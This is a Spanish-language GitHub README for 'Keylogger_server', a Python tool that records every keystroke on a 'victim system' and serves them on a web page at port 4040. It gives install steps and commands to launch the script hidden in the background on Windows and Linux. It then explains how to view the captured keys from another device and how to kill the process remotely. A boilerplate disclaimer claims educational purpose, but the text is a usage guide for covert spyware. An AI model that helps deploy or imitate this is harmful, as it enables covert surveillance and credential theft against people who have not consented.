<body>
  <h1>Keylogger_server🐍</h1>

  <p>Es la herramienta perfecta para captar todas las pulsaciones del teclado y visualizar las mismas por sitio web de manera comoda. Además el proceso se detiene remotamente mediante boton 😎
  </p>

  <h2>Requisitos🙋</h2>

  <ul>
    <li>Python 3.12 o superior</li>
    <li>Bibliotecas necesarias instaladas en el sistema</li>
  </ul>

  <h2>Instalación👁️</h2>

  <p>Siga estos pasos para instalar de manera rapida por consola en windows/linux: </p>

<ol>
<li>Clonar el repositorio:</li>

    git clone https://github.com/skipy95d/KeyLogger_server.git

<li>Instalar las dependencias:</li>

  en windows:
  
    python -m pip install --upgrade pip
y

    pip install pynput http.server requests pyinstaller

  en linux:
  
    python -m pip install --upgrade pip && pip3 install pynput http.server requests pyinstaller
    
</ol>

  <h2>Uso🥸</h2>

  <p>Siga los pasos a continuación para disfrutar del mismo:</p>

  <ol>
    <li>Verificar la dirección ipv4 del sistema víctima, una forma de hacerlo es por ejemplo por consola ejecutar... <br>
  En windows:
    
    ipconfig
  en linux:

    ip a
</li>
<li>
  Ahora iniciamos el script en segundo plano para que no use ventana (podremos cerrar la ventana luego de ejecutar el script)... <br>
  En windows:

    Start-Process pythonw -ArgumentList "keylogger_server.pyw" -NoNewWindow -RedirectStandardOutput "output.log" -RedirectStandardError "error.log"
 En linux:
 
    nohup python3 keylogger_server.pyw > output.log 2>&1 &
</li>
<li>luego desde el dispositivo que usemos, por ejemplo un smartphone abriremos el sitio web para visualizar todas las teclas del sistema víctima (recordemos colocar el puerto el cual es 4040)
  
    http://<ipv4>:4040
</li>
<li>Perfecto, cada vez que el sistema víctima envie pulsaciones del teclado, nuestro sitio web estara listo para mas información, por lo tanto solo resta recargar el sitio web las veces que querramos.
</li></ol>

<h2>Detener servicio de manera remota✋</h2>
<ol>
<p>Solo hace falta pulsar el boton "detener proceso" en el mismo sitio web, esto enviara una orden al sistema víctima que matara todos los procesos, por lo tanto el sitio web tampoco estara disponible</p>
</ol>

<h2>Descargo de responsabilidades🚨</h2>
<p>El código proporcionado en este repositorio se ha desarrollado con fines educativos o de investigación en el campo de la ciberseguridad. <br>
No me hago responsable del mal uso de este código. Se recomienda a los usuarios que revisen cuidadosamente el código antes de utilizarlo y que lo empleen de forma responsable y ética.<br>
Al utilizar este código, usted acepta lo siguiente:<br>
 * No utilizará este código para fines maliciosos.<br>
 * No utilizará este código para causar daños a otras personas o sistemas.<br>
 * No utilizará este código para infringir la ley.<br>
 * Será responsable de las consecuencias del uso de este código.<br>
No me hago responsable de las siguientes consecuencias:<br>
 * Cualquier daño o pérdida causada por el uso de este código.<br>
 * Cualquier infringimiento de la ley causado por el uso de este código.<br>
 <br>
 Si tiene alguna pregunta sobre este código, por favor, póngase en contacto por mi correo.
  
  <h2>Sociales🧑‍💻</h2>
<ul>
  <li><a href="https://youtube.com/@skipy95d">Youtube</a></li>
  <li><a href="https://twitch.tv/skipy95d">Twitch</a></li>
</ul>
<h2>Imagenes📷</h2>
<p>En este ejemplo en mi maquina Kali inicie el script en segundo plano y desde mi maquina windows accedi al visor web</p>

[![Captura-de-pantalla-2024-03-03-092729.png](https://i.postimg.cc/pdBx3r4W/Captura-de-pantalla-2024-03-03-092729.png)](https://postimg.cc/1g4Lqmy2)

<h2>Explicado por video🎥</h2>

https://www.youtube.com/watch?v=gki4JrXc9YM

<h2>🌟¡Gracias por su estrellita a mi perfil !🌟</h2>

